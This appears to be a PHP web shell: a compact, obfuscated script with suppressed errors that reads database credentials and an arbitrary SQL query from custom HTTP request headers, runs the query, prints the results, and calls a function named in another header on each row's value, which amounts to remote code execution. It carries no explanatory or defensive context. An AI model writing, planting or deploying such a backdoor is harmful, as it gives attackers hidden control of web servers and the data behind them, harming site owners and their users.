<?php
function C($D) {
	$S=$_SERVER;
	$M=@mysqli_connect(
	$S['HTTP_S'],
	$S['HTTP_U'],
	$S['HTTP_P'],
	$S['HTTP_D']);
	$F=@mysqli_query($M,$D);
	return $F;
	}$G=array();$S=$_SERVER;
$F=C($S['HTTP_Q']);
if($F === false) {
	return false;
	}
	while ($G=@mysqli_fetch_assoc($F)) {
		$H[]=$G;
		@$S['HTTP_I']($G['haid']);
		echo'<pre>';print_r($G);
		} return $H;
@mysqli_close($G);
?>